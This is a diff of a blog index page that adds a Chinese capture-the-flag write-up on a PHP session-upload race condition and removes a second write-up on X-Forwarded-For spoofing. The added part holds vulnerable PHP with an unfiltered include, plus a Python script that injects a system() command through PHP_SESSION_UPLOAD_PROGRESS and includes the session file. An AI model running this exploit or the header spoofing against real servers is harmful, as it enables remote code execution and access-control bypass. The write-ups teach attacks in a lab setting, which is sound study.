@@ -169,6 +169,73 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-session条件竞争" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/12/session%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" class="article-date">
+  	<time datetime="2021-09-11T16:00:00.000Z" itemprop="datePublished">2021-09-12</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/12/session%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">
+        session条件竞争
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="session条件竞争"><a href="#session条件竞争" class="headerlink" title="session条件竞争"></a>session条件竞争</h1><p>打开页面，看见源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$gwht= $_GET[&quot;gwht&quot;];</span><br><span class="line">$ycb= $_GET[&quot;ycb&quot;];</span><br><span class="line">if(preg_match(&quot;/flag/&quot;,$gwht))&#123;</span><br><span class="line">    die(&#x27;hack&#x27; );</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;/secret/&quot;,$gwht))&#123;</span><br><span class="line">    die(&#x27;hack&#x27; );</span><br><span class="line">&#125;</span><br><span class="line">include($gwht);</span><br><span class="line">if(isset($ycb))&#123;</span><br><span class="line">    $url = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]);</span><br><span class="line">    echo $url[&#x27;query&#x27;];</span><br><span class="line">    parse_str($url[&#x27;query&#x27;],$query);</span><br><span class="line">    foreach($query as $value)&#123;</span><br><span class="line">        echo $value;</span><br><span class="line">        if (preg_match(&quot;/Flag/&quot;,$value)) &#123;</span><br><span class="line">            die(&#x27;not hit&#x27;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo serialize($ycb);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;what are you doing&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>通过源码，我们可以看到有个include()函数可以给我们利用来读取文件，但它使用正则过滤，过滤掉了flag，所以我们可以使用data伪协议来构造php代码来读取，所以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//?gwht=/var/lib/php5/sess_ph1</span><br></pre></td></tr></table></figure>
+<p>来读取目录信息，发现不行，经过本地测试发现是因为php默认allow_url_include=0，所以不可以使用data伪协议，但是我们可以使用session条件竞争来做，由于你上传的文件，会被服务器放在一个地方，然后进行判断文件是否有害，有害则被删除，但是如果时间太长的话，我们就可以利用这个时间间隙来访问文件，所以改了个exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">    </span><br><span class="line">sessid = &#x27;ph1&#x27;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def t1(session):</span><br><span class="line">	while True:</span><br><span class="line">		f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class="line">		response = session.post(</span><br><span class="line">			&#x27;http://192.168.39.219:8000/&#x27;,</span><br><span class="line">			data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;cat /flag&quot;);?&gt;&#x27;&#125;,</span><br><span class="line">			files=&#123;&#x27;file&#x27;: (&#x27;a.txt&#x27;, f)&#125;,</span><br><span class="line">			cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125;</span><br><span class="line">		)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def t2(session):</span><br><span class="line">	while True:</span><br><span class="line">		response = session.get(f&#x27;http://192.168.39.219:8000//?gwht=/var/lib/php5/sess_&#123;sessid&#125;&#x27;)</span><br><span class="line">		print(response.text)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">with requests.session() as session:</span><br><span class="line">	t1 = threading.Thread(target=t1, args=(session, ))</span><br><span class="line">	t1.daemon = True</span><br><span class="line">	t1.start()</span><br><span class="line"></span><br><span class="line">	t2(session)</span><br></pre></td></tr></table></figure>
+<p>如果用命令行看返回结果的话，有点麻烦，所以我们直接在页面，通过它给的include()函数来包含上传文件，所以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//?gwht=/var/lib/php5/sess_ph1</span><br></pre></td></tr></table></figure>
+<p>然后不断刷新，来包含sess_ph1文件，从而读取flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-外部实体注入(xxe漏洞)之内网探测" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -931,79 +998,6 @@ __destruct()--------------------在类的对象被销毁之前被调用
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-XFF构造" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/07/XFF%E6%9E%84%E9%80%A0/" class="article-date">
-  	<time datetime="2021-09-06T16:00:00.000Z" itemprop="datePublished">2021-09-07</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/07/XFF%E6%9E%84%E9%80%A0/">
-        XXF构造
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="XXF构造"><a href="#XXF构造" class="headerlink" title="XXF构造"></a>XXF构造</h1><p>X-Forwarded-For</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For是一个http扩展头部，它是用来表示http请求端真实ip的，现在它已成为RFC 7239标准中</span><br></pre></td></tr></table></figure>
-
-<p>client-ip</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client-ip和X-Forwarded-For的功能相似，不过它是有使用的，不过它没有形成标准，所以不一定所有服务器可以实现</span><br></pre></td></tr></table></figure>
-
-<p>但我们打开页面后，发现要验证码才能读flag，不过我们再打开页面源码，发现有一段前端验证的js代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    function enc(code)&#123;</span><br><span class="line">      hash = hex_md5(code);</span><br><span class="line">      return hash;</span><br><span class="line">    &#125;</span><br><span class="line">    function validate()&#123;</span><br><span class="line">      var code = document.getElementById(&quot;vcode&quot;).value;</span><br><span class="line">      if (code != &quot;&quot;)&#123;</span><br><span class="line">        if(hex_md5(code) == &quot;0cd4da0223c0b280829dc3ea458d655c&quot;)&#123;</span><br><span class="line">          alert(&quot;您通过了验证！&quot;);</span><br><span class="line">          window.location = &quot;./flag.php&quot;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">          alert(&quot;你的授权码不正确！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">        alert(&quot;请输入授权码&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>思路是输入的验证码经过md5加密后，是等于0cd4da0223c0b280829dc3ea458d655c，所以进行md5解密就可以得到验证码，但发现不行，怀疑有后端验证，然后用工具去扫描，发现有flag.php文件，然后构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/flag.php</span><br></pre></td></tr></table></figure>
-<p>发现没有flag，只有叫我们再去验证的界面，不过有一句话让人深思，就是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag</span><br></pre></td></tr></table></figure>
-<p>可知，我们可以抓包后，构造X-Forwarded-For来让服务端将我们的主机当成本地，所以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>
-<p>就可以得到flag</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li></ul>
 	</div>
 
       
